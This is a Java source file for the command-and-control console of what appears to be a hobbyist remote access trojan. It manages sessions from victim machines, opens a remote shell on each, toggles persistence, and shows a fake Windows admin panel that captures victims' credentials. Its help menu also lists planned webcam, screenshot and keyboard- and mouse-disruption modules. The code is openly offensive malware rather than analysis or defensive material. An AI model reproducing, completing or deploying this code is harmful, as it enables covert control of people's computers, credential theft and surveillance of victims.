import java.net.*;
import java.io.*;
import cs1.*;
import java.util.*;
public class Server implements Runnable {
    ServerSocket ss;
    Socket s;
    BufferedReader din;
    DataOutputStream dout;
    PrintStream ps;
    OutputStream os;
    ArrayList<Socket> sessions = new ArrayList<Socket>();
    ArrayList<String> hostnames = new ArrayList<String>();
    public static void main(String[] args) throws Exception {
        Server serv = new Server();
        (new Thread(new SessionListener(serv))).start();
        serv.run();
    }
    public Server() {
    }
    public void run() {
        try {
            //System.out.println("connection from " + s.getInetAddress());
            String command;
            while(true) {
                System.out.print("<console> : ");
                command=Keyboard.readString();
                command=command.toLowerCase().trim();
                if (command.equals("help")) {
                    System.out.println("HELP MENU:");
                    System.out.println("\tWORKING - persist - initiate persistance on remote machine");
                    System.out.println("\tWORKING - shell - enter a stateless shell environment");
                    //System.out.println("\tIN PROGRESS - upload - open prompt for uploading a file");
                    //System.out.println("\tIN PROGRESS - download - open prompt for downloading a remote file");
                    ///System.out.println("\tIN PROGRESS - screenshot - take a screenshot of the remote machine");
                    //System.out.println("\tIN PROGRESS - webcam - take an image using the victims camera");
                    //System.out.println("\tIN PROGRESS - mousebreak - prevent the victims mouse from moving");
                    //System.out.println("\tIN PROGRESS - keybreak - create issues with the victims keyboard");
                    System.out.println("\tWORKING - adminpanel - creates a fake windows admin panel");
                    System.out.println("\tWORKING - sessions - lists sessions");
                    System.out.println("\tWORKING - selectsession - change to a different session");
                }
                if (command.equals("persist")) {
                    try {
                        System.out.println("persistence module initiated");
                        System.out.println("\nEnter 1 to create persistence, enter 2 to remove persistence");
                        String choice = Keyboard.readString();
                        if (choice.equals("1")) {
                            ps.println("ps99");   
                        } else if (choice.equals("2")) {
                            ps.println("ps-99");
                        }
                    } catch (Exception e) {
                        System.out.println("failed to add persistence");
                    }
                }
                if (command.equals("shell")) {
                    System.out.println("shell environment initiated");
                    System.out.println("type -99 to exit environemt");
                    try {
                        ps.println("sh99");
                        din.readLine();
                        ps.println("echo %username%");
                        String uname = din.readLine();
                        din.readLine();
                        while(true) {
                            System.out.print(uname + ">");
                            String in = Keyboard.readString();
                            if (in.equals("-99")) {
                                break;
                            }
                            ps.println(in);
                            String line = din.readLine();
                            while(!line.equals("{}{}{}")) {
                                System.out.println(line);
                                line=din.readLine();
                            }
                        }
                        ps.println("sh-99");
                    } catch (Exception e) {
                        System.out.println("shell connection dropped");
                        System.out.println("session might be offline!");
                    }
                }
                if (command.equals("upload")) {
                    System.out.println("file upload initiated");
                    
                }
                if (command.equals("download")) {
                    System.out.println("file download initiated");
                    
                }
                if (command.equals("screenshot")) {
                    System.out.println("screenshot module initiated");
                    
                }
                if (command.equals("webcam")) {
                    System.out.println("webcam module initiated");
                    
                }
                if (command.equals("mousebreak")) {
                    System.out.println("mousebreak attack initiated");
                    
                }
                if (command.equals("keybreak")) {
                    System.out.println("keybreak attack initiated");
                    
                }
                if (command.equals("nircmd")) {
                    System.out.println("nircmd control initiated");
                    
                }
                if (command.equals("adminpanel")) {
                    System.out.println("starting remote admin panel");
                    ps.println("ap99");
                    System.out.println("how long would you like the panel to remain in seconds?");
                    int seconds = (int)Keyboard.readDouble();
                    ps.println(seconds);
                    din.readLine();
                    String line = "";
                    System.out.println("WINDOW INITIATED\nLISTENING FOR CREDENTIALS...\n\n");
                    while(!line.equals("{}{}{}")) {
                        line=din.readLine();
                        if (!line.equals("{}{}{}")) {
                            System.out.println("CREDENTIALS GRABBED - " + line);
                        }
                    }
                    System.out.println();
                }
                if (command.equals("sessions")) {
                    try {
                        System.out.println("LISTING SESSIONS:\n");
                        for(int i=0;i<sessions.size();i++) {
                            System.out.println(i + " - " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i));
                        }
                    } catch (Exception e) {
                        System.out.println("failed to list sessions");
                    }
                }
                if (command.equals("selectsession")) {
                    try {
                        System.out.println("\nenter a valid session #:");
                        int sesnum = Keyboard.readInt();
                        s = sessions.get(sesnum);
                        ps = new PrintStream(s.getOutputStream());
                        os = s.getOutputStream();
                        din = new BufferedReader(new InputStreamReader(s.getInputStream()));
                        System.out.println("now connected to session " + sesnum);
                        System.out.println("connected session IP is " + s.getInetAddress());
                        System.out.println("connected session HOSTNAME is " + hostnames.get(sesnum));
                    } catch (Exception e) {
                        System.out.println("failed to change session");
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void addSocket(Socket cs) {
        try {
            PrintStream tps = new PrintStream(cs.getOutputStream());
            OutputStream tos = cs.getOutputStream();
            BufferedReader tdin = new BufferedReader(new InputStreamReader(cs.getInputStream()));
            tps.println("sh99");
            tps.println("@echo off");
            tdin.readLine();
            tps.println("FOR /F \"usebackq\" %i IN (`hostname`) DO echo %i");
            tdin.readLine();
            String hostname = tdin.readLine();
            hostname = hostname.substring(hostname.indexOf(" ")+1);
            hostnames.add(hostname);
            sessions.add(cs);
            System.out.println("NEW CONNECTION - " + cs.getInetAddress() + " - " + hostname);
            tps.println("sh-99");
        } catch (Exception e) {
            System.out.println("failed to add new socket");
        }
    }
 }